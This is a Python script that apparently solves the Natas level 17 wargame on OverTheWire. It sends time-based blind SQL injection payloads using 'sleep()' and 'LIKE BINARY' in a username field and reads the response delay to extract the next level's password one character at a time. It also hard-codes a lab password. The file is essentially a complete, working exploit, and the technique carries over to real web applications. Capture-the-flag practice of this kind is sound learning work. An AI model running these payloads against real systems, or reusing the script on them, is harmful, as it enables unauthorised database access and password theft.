import requests
import string

URL = "http://natas17.natas.labs.overthewire.org/"
NATAS17_PASSWORD = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"  # Change this
INJECTION_TIME = 5  # Time delay for blind sql injection in seconds

s = requests.Session()
s.auth = ("natas17", NATAS17_PASSWORD)


def get_valid_characters():
    print(
        "[+] The password for natas18 contains these characters: ", end="", flush=True
    )
    characters = string.digits + string.ascii_letters
    valid_characters = ""

    for character in characters:
        payload = f'natas18" AND password LIKE BINARY "%{character}%" AND sleep({INJECTION_TIME})-- -'
        data = {"username": payload}
        r = s.post(URL, data=data)

        if r.elapsed.seconds >= INJECTION_TIME:
            valid_characters += character
            print(character, end="", flush=True)

    return valid_characters


def get_password(valid_characters):
    print("\n[!] The password for natas18 is: ", end="", flush=True)
    natas18_password = ""
    for _ in range(32):
        for character in valid_characters:
            payload = f'natas18" AND password LIKE BINARY "{natas18_password + character}%" AND sleep({INJECTION_TIME})-- -'
            data = {"username": payload}
            r = s.post(URL, data=data)

            if r.elapsed.seconds >= INJECTION_TIME:
                natas18_password += character
                print(character, end="", flush=True)
                break

    return natas18_password


def main():
    valid_characters = get_valid_characters()
    get_password(valid_characters)


if __name__ == "__main__":
    main()
